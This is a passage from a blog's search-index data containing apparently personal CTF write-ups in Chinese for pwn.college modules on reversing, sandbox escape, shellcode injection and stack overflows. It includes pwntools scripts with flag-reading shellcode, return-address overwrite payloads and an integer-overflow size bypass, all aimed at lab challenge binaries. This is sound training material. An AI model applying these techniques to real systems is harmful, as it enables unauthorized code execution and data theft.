id=\"Level29\"><a href=\"#Level29\" class=\"headerlink\" title=\"Level29\"></a>Level29</h4><p>​        利用<code>stdbuf</code>设置输出缓冲为0，利用<code>/bin/sh</code>执行并提权。</p>\n<h4 id=\"Level30\"><a href=\"#Level30\" class=\"headerlink\" title=\"Level30\"></a>Level30</h4><p>​    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.38.12.png\" alt=\"截屏2022-03-03 上午9.38.12\"></p>\n<h4 id=\"Level34\"><a href=\"#Level34\" class=\"headerlink\" title=\"Level34\"></a>Level34</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.50.31.png\" alt=\"截屏2022-03-03 上午9.50.31\"></p>\n<h4 id=\"Level35\"><a href=\"#Level35\" class=\"headerlink\" title=\"Level35\"></a>Level35</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.55.21.png\" alt=\"截屏2022-03-03 上午9.55.21\"></p>\n<h4 id=\"Level36\"><a href=\"#Level36\" class=\"headerlink\" title=\"Level36\"></a>Level36</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.57.38.png\" alt=\"截屏2022-03-03 上午9.57.38\"></p>\n<h4 id=\"Level37\"><a href=\"#Level37\" class=\"headerlink\" title=\"Level37\"></a>Level37</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.00.42.png\" alt=\"截屏2022-03-03 上午10.00.42\"></p>\n<h4 id=\"Level38\"><a href=\"#Level38\" class=\"headerlink\" title=\"Level38\"></a>Level38</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.02.08.png\" alt=\"截屏2022-03-03 上午10.02.08\"></p>\n<h4 id=\"level39\"><a href=\"#level39\" class=\"headerlink\" title=\"level39\"></a>level39</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.04.09.png\" alt=\"截屏2022-03-03 上午10.04.09\"></p>\n<h4 id=\"Level41\"><a href=\"#Level41\" class=\"headerlink\" title=\"Level41\"></a>Level41<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.17.52.png\" alt=\"截屏2022-03-03 上午10.17.52\"></h4><h4 id=\"Level42\"><a href=\"#Level42\" class=\"headerlink\" title=\"Level42\"></a>Level42</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.20.23.png\" alt=\"截屏2022-03-03 上午10.20.23\"></p>\n<h4 id=\"Level45\"><a href=\"#Level45\" class=\"headerlink\" title=\"Level45\"></a>Level45</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.52.14.png\" alt=\"截屏2022-03-03 上午10.52.14\"></p>\n<h4 id=\"Level47\"><a href=\"#Level47\" class=\"headerlink\" title=\"Level47\"></a>Level47</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.59.45.png\" alt=\"截屏2022-03-03 上午10.59.45\"></p>\n<h4 id=\"Level49\"><a href=\"#Level49\" class=\"headerlink\" title=\"Level49\"></a>Level49</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8811.05.44.png\" alt=\"截屏2022-03-03 上午11.05.44\"></p>\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"Debugging Refresher","url":"/2022/02/14/Debugging%20Refresher/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-QzGMiCAT\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h4 id=\"Level1\"><a href=\"#Level1\" class=\"headerlink\" title=\"Level1\"></a>Level1</h4><p>​        直接r，然后c到断点。</p>\n<h4 id=\"Level2\"><a href=\"#Level2\" class=\"headerlink\" title=\"Level2\"></a>Level2</h4><p>​        <code>p/x $r12</code></p>\n<h4 id=\"Level3\"><a href=\"#Level3\" class=\"headerlink\" title=\"Level3\"></a>Level3</h4><p>​        不好描述，可以根据后面的正确随机数在栈中找到对应的位置，然后重新执行并输入。</p>\n<h4 id=\"Level4\"><a href=\"#Level4\" class=\"headerlink\" title=\"Level4\"></a>Level4</h4><p>​        。。。。</p>\n<h4 id=\"Level5\"><a href=\"#Level5\" class=\"headerlink\" title=\"Level5\"></a>Level5</h4><p>gdb脚本。</p>\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"ReverseEngineering","url":"/2022/02/15/ReverseEngineering/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-uCWlIODN\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n\n\n\n\n\n\n<h4 id=\"Level1-0\"><a href=\"#Level1-0\" class=\"headerlink\" title=\"Level1.0\"></a>Level1.0</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8A%E5%8D%884.12.04.png\" alt=\"截屏2022-02-15 上午4.12.04\"></p>\n<h4 id=\"Level1-1\"><a href=\"#Level1-1\" class=\"headerlink\" title=\"Level1.1\"></a>Level1.1</h4><p>​        同上，一样的做法。</p>\n<h4 id=\"Level2-0\"><a href=\"#Level2-0\" class=\"headerlink\" title=\"Level2.0\"></a>Level2.0</h4><p>​        交换idx3和idx4的位置</p>\n<h4 id=\"Level2-1\"><a href=\"#Level2-1\" class=\"headerlink\" title=\"Level2.1\"></a>Level2.1</h4><p>​        交换idx1和idx4.</p>\n<p>​        ps：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%883.28.51.png\" alt=\"截屏2022-02-15 下午3.28.51\"></p>\n<p>​        输入五个字符，转化为ascii后以int类型贮存，从栈布局可以看出v10大小是4个字，所以第五个字被储存在v11。</p>\n<h4 id=\"Level3-0\"><a href=\"#Level3-0\" class=\"headerlink\" title=\"Level3.0\"></a>Level3.0</h4><p>​        reverse</p>\n<h4 id=\"Level3-1\"><a href=\"#Level3-1\" class=\"headerlink\" title=\"Level3.1\"></a>Level3.1</h4><p>​        同上。</p>\n<h4 id=\"Level4-0\"><a href=\"#Level4-0\" class=\"headerlink\" title=\"Level4.0\"></a>Level4.0</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">3</span>; ++j )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">for</span> ( k = <span class=\"number\">0</span>; k &lt; <span class=\"number\">4</span> - j; ++k )</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ( *((_BYTE *)&amp;v15 + k - <span class=\"number\">14</span>) &gt; *((_BYTE *)&amp;v15 + k - <span class=\"number\">13</span>) )</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">       v4 = *((_BYTE *)&amp;v15 + k - <span class=\"number\">14</span>);</span><br><span class=\"line\">       *((_BYTE *)&amp;v15 + k - <span class=\"number\">14</span>) = *((_BYTE *)&amp;v15 + k - <span class=\"number\">13</span>);</span><br><span class=\"line\">       *((_BYTE *)&amp;v15 + k - <span class=\"number\">13</span>) = v4;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<p>​        一个简单的冒泡排序算法。</p>\n<h4 id=\"level4-1\"><a href=\"#level4-1\" class=\"headerlink\" title=\"level4.1\"></a>level4.1</h4><p>​        同上</p>\n<h4 id=\"Level5-0\"><a href=\"#Level5-0\" class=\"headerlink\" title=\"Level5.0\"></a>Level5.0</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">4</span>; ++j )</span><br><span class=\"line\">   *((_BYTE *)&amp;v13 + j - <span class=\"number\">14</span>) ^= <span class=\"number\">0xCD</span>u;</span><br></pre></td></tr></table></figure>\n\n<p>​        异或加密，需要用到简单的脚本（手抠也不是不行）</p>\n<h4 id=\"Level5-1\"><a href=\"#Level5-1\" class=\"headerlink\" title=\"Level5.1\"></a>Level5.1</h4><p>​        同上，好饿。</p>\n<h4 id=\"Level6-0\"><a href=\"#Level6-0\" class=\"headerlink\" title=\"Level6.0\"></a>Level6.0</h4><p>​        可以批量导出数据，避免手动处理数组</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%885.15.04.png\" alt=\"截屏2022-02-15 下午5.15.04\"></p>\n<p>​        程序的逻辑是输入的字符串进行降序排序-&gt;条件异或，我们需要通过结果反推输入值，</p>\n<p>​        因为程序一定会对字符串进行降序排序，所以输入字符串的顺序其实意义不大，无论是怎么打乱，最后处理的结果都是一样的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = [<span class=\"number\">0x64</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x7F</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x73</span>, <span class=\"number\">0x4B</span>, <span class=\"number\">0x71</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i % <span class=\"number\">2</span>  == <span class=\"number\">0</span>):</span><br><span class=\"line\">        x[i] ^= <span class=\"number\">0x10</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">      x[i] ^= <span class=\"number\">0x29</span></span><br><span class=\"line\"></span><br><span class=\"line\">    a = <span class=\"built_in\">chr</span>(x[i])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(a)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"Sandboxing","url":"/2022/02/28/Sandboxing/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-yrbIritf\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h4 id=\"Level1\"><a href=\"#Level1\" class=\"headerlink\" title=\"Level1\"></a>Level1</h4><p>​        首先考察<code>chroot</code></p>\n<p>​        因为程序在将根目录设置为<code>/jail</code>的时候并没有切换当前工作目录为<code>/jail</code>，所以我们实际上还是在<code>/</code>目录，因此可以直接通过<code>argv[1]</code>    读取flag。</p>\n<p>​        执行脚本的时候需要添加<code>cwd</code>参数，使其工作目录为<code>/</code></p>\n<h4 id=\"Level2\"><a href=\"#Level2\" class=\"headerlink\" title=\"Level2\"></a>Level2</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">shellcode = asm(shellcraft.readfile(<span class=\"string\">&#x27;flag&#x27;</span>,<span class=\"number\">1</span>))</span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/challenge/babyjail_level2&quot;</span>, <span class=\"string\">&quot;/&quot;</span>],cwd=<span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\">p.send(shellcode)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Level3\"><a href=\"#Level3\" class=\"headerlink\" title=\"Level3\"></a>Level3</h4><p>​            关键源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">assert(argc &gt; <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Checking to make sure you&#x27;re not trying to open the flag.\\n&quot;</span>);</span><br><span class=\"line\">   assert(<span class=\"built_in\">strstr</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">&quot;flag&quot;</span>) == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">int</span> fd = open(argv[<span class=\"number\">1</span>], O_RDONLY|O_NOFOLLOW);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">       <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Failed to open the file located at `%s`.\\n&quot;</span>, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">       <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Successfully opened the file located at `%s`.\\n&quot;</span>, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">char</span> jail_path[] = <span class=\"string\">&quot;/tmp/jail-XXXXXX&quot;</span>;</span><br><span class=\"line\">   assert(mkdtemp(jail_path) != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Creating a jail at `%s`.\\n&quot;</span>, jail_path);</span><br><span class=\"line\"></span><br><span class=\"line\">   assert(chroot(jail_path) == <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Moving the current working directory into the jail.\\n&quot;</span>);</span><br><span class=\"line\">   assert(chdir(<span class=\"string\">&quot;/&quot;</span>) == <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">int</span> fffd = open(<span class=\"string\">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class=\"line\">   write(fffd, <span class=\"string\">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">   close(fffd);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"Program_interaction","url":"/2022/01/17/Program_interaction/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-UjTrCOvn\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>「前面不太记得了，从level3记起」</p>\n<h3 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h3><p><code> ./embryoio_level3  xkbdyoisnx</code>    </p>\n<h4 id=\"Level4\"><a href=\"#Level4\" class=\"headerlink\" title=\"Level4\"></a>Level4</h4><p><code>export jouixn = xxx</code></p>\n<h4 id=\"Level5\"><a href=\"#Level5\" class=\"headerlink\" title=\"Level5\"></a>Level5</h4><p>​    一个标准输入重定向的考察，</p>\n<p><code>./embryoio_level5 &lt; /tmp/mihsjr</code></p>\n<p>​        还需要编辑<code>mihsjr </code>的内容为给的密码。</p>\n<h4 id=\"Level6\"><a href=\"#Level6\" class=\"headerlink\" title=\"Level6\"></a>Level6</h4><p>​        一个输出重定向，创建对应文件<code>./embryoio_level6 &gt; /tmp/ptyaid </code>，flag在<code>ptyaid</code>中。</p>\n<h4 id=\"Level7\"><a href=\"#Level7\" class=\"headerlink\" title=\"Level7\"></a>Level7</h4><p><code>env -i ./xxx</code></p>\n<h4 id=\"Level8\"><a href=\"#Level8\" class=\"headerlink\" title=\"Level8\"></a>Level8</h4><p>​        写个sh脚本，内容是打开这个题目。注意路径。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hacker@embryoio_level8:~$ cat my_script.sh </span><br><span class=\"line\">/challenge/embryoio_level8</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Level9\"><a href=\"#Level9\" class=\"headerlink\" title=\"Level9\"></a>Level9</h4><p>​        与level8同理，顺手输个密码就行。</p>\n<h4 id=\"Level10\"><a href=\"#Level10\" class=\"headerlink\" title=\"Level10\"></a>Level10</h4><p>​        同level3</p>\n<h4 id=\"Level11\"><a href=\"#Level11\" class=\"headerlink\" title=\"Level11\"></a>Level11</h4><p>​        同level4。</p>\n<h4 id=\"Level12\"><a href=\"#Level12\" class=\"headerlink\" title=\"Level12\"></a>Level12</h4><p>​        同level5</p>\n<h4 id=\"Level13\"><a href=\"#Level13\" class=\"headerlink\" title=\"Level13\"></a>Level13</h4><p>​        同level6</p>\n<h4 id=\"Level14\"><a href=\"#Level14\" class=\"headerlink\" title=\"Level14\"></a>Level14</h4><p>​        同level7</p>\n<h4 id=\"Level15\"><a href=\"#Level15\" class=\"headerlink\" title=\"Level15\"></a>Level15</h4><p>​        一言难尽，可以在ipython里用pwntools。</p>\n<h4 id=\"Level16\"><a href=\"#Level16\" class=\"headerlink\" title=\"Level16\"></a>Level16</h4><p>​        同15。</p>\n<h4 id=\"Level17\"><a href=\"#Level17\" class=\"headerlink\" title=\"Level17\"></a>Level17</h4><p>​        这几个level就是将python与之前level的命令行参数或者环境变量结合，虽然难度不高但是很考验pwntools运用的熟练度。所以我还没有找到做出来的方法。</p>\n<h4 id=\"Level18\"><a href=\"#Level18\" class=\"headerlink\" title=\"Level18\"></a>Level18</h4><p>​        利用python设置环境变量，主要利用到<code>os.environ</code>或者<code>os.putenv</code>函数。</p>\n<h4 id=\"Level19\"><a href=\"#Level19\" class=\"headerlink\" title=\"Level19\"></a>Level19</h4><p>​        </p>\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"Shellcode_Injection","url":"/2022/01/29/Shellcode_Injection/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-gTnZoMeo\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n\n\n<p>​        整个专题其实就是一个shellcode编写的小练习，并不需要自己寻找漏洞点，写好shellcode直接注入就行。</p>\n<p>​        如果要将服务器的文件传输到本地的话可以使用:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">scp -i key -r hacker@dojo.pwn.college:/challenge [本地路径]</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Level1\"><a href=\"#Level1\" class=\"headerlink\" title=\"Level1\"></a>Level1</h4><p>​        可以用pwntools的shellcraft模块，但是也可以手写shellcode。</p>\n<p>​        这道题可以用简单的orw的思路做。但是shellcode的地址需要在规定的地方。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.amd64.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;/flag&quot;</span>)\t\t</span><br><span class=\"line\">shellcode += shellcraft.amd64.read(<span class=\"string\">&#x27;rax&#x27;</span>, stack + <span class=\"number\">0x100</span>, <span class=\"number\">0x100</span>)</span><br><span class=\"line\">shellcode += shellcraft.amd64.write(<span class=\"number\">1</span>, stack + <span class=\"number\">0x100</span>, <span class=\"number\">0x100</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Level2\"><a href=\"#Level2\" class=\"headerlink\" title=\"Level2\"></a>Level2</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.amd64.nop()*<span class=\"number\">0x800</span></span><br><span class=\"line\">shellcode = shellcraft.amd64.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;/flag&quot;</span>)\t\t</span><br><span class=\"line\">shellcode += shellcraft.amd64.read(<span class=\"string\">&#x27;rax&#x27;</span>, stack + <span class=\"number\">0x100</span>, <span class=\"number\">0x100</span>)</span><br><span class=\"line\">shellcode += shellcraft.amd64.write(<span class=\"number\">1</span>, stack + <span class=\"number\">0x100</span>, <span class=\"number\">0x100</span>)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Level3\"><a href=\"#Level3\" class=\"headerlink\" title=\"Level3\"></a>Level3</h4><p>​        换个地址就行</p>\n<h4 id=\"Level4\"><a href=\"#Level4\" class=\"headerlink\" title=\"Level4\"></a>Level4</h4><p>​        shellcode不能含有”H”。</p>\n<p>​        第一个想到的就是不能含有<code>push</code>，其他指令似乎也没有h了。想要完成的话第一个思路是手写不含push的shellcode，另外一个思路是构造跳板读取其他位置的shellcode（这种思路其实比较常见并且配套的视频中也提到过）</p>\n<p>​        但是实际做题体验极差，写了read()后，读取的shellcode无论怎样都无法读到flag，明明已经getshell了，也没有eof，但是就是没办法。以后再想吧。</p>\n<h4 id=\"Level5\"><a href=\"#Level5\" class=\"headerlink\" title=\"Level5\"></a>Level5</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-18%20%E4%B8%8B%E5%8D%8810.02.44.png\" alt=\"截屏2022-02-18 下午10.02.44\"></p>\n<p>​        需要让shellcode在运行时生成<code>syscall()</code>。</p>\n<p>一个比较自然的想法就是把对应的机器码储存在寄存器中，然后拿出来用。</p>\n<p><code>int 0x80</code>对应的机器码<code>CD 80 </code></p>\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"MemoryErrors","url":"/2022/03/03/MemoryErrors/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-NVNfrHnM\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>​        视频主要介绍了栈溢出及其保护。保护的绕过包括canary和pie，并没有提到NX（那个似乎在后面一个module）</p>\n<p>​        传输题目到本地可以使用<code>scp</code>命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">scp -i key -r hacker@dojo.pwn.college:/challenge/babymem_level4.1 /Users/rin/ctf/pwn/pwn_college/MemoryErrors</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"Level1-0\"><a href=\"#Level1-0\" class=\"headerlink\" title=\"Level1.0\"></a>Level1.0</h4><p>​        随便溢，覆盖掉变量就行。</p>\n<h4 id=\"Level1-1\"><a href=\"#Level1-1\" class=\"headerlink\" title=\"Level1.1\"></a>Level1.1</h4><p>​        随便溢。</p>\n<h4 id=\"Level2-0\"><a href=\"#Level2-0\" class=\"headerlink\" title=\"Level2..0\"></a>Level2..0</h4><p>​        随便溢。</p>\n<h4 id=\"level2-1\"><a href=\"#level2-1\" class=\"headerlink\" title=\"level2.1\"></a>level2.1</h4><p>​        这道题理论上也是需要溢出到v9，但是很奇怪。多试几次会发现溢出得足够大的时候就会有flag了，这里溢出0x1000个就行。</p>\n<p>​        关于为什么要溢出那么多：我找了很久也没有找到第二次输入的时候缓冲区的地址，大概是利用到了堆内存。</p>\n<h4 id=\"Level3-0\"><a href=\"#Level3-0\" class=\"headerlink\" title=\"Level3.0\"></a>Level3.0</h4><p>​        没啥好说的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level3.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">win_addr = <span class=\"number\">0x4019fa</span></span><br><span class=\"line\">payload = <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">152</span> + p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Payload size:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;!&quot;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        </p>\n<h4 id=\"Level3-1\"><a href=\"#Level3-1\" class=\"headerlink\" title=\"Level3.1\"></a>Level3.1</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level3.1&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level3.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">win_addr = <span class=\"number\">0x401D35</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">105</span> + p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(<span class=\"string\">b&quot;115&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​            </p>\n<p>为什么偏移量这么难找。</p>\n<h4 id=\"Level4-0\"><a href=\"#Level4-0\" class=\"headerlink\" title=\"Level4.0\"></a>Level4.0</h4><p>​        这个题也是蛮灵性的，只能最多输入18个字符但是溢出量是40。</p>\n<p>​        注意到实际上程序对于第一次输入的size是没有很严格检测的，所以我们可以输入任意小于18的数字，比如负数。并且负责控制输入size的实际上是一个无符号整数。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8A%E5%8D%8810.16.03.png\" alt=\"截屏2022-03-05 上午10.16.03\"></p>\n<p>对于int型的负数强制类型转换，使得实际能输入的size变得非常大。所以这里其实相当于构建了一个整数溢出，然后绕过了size后面就比较常规了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span 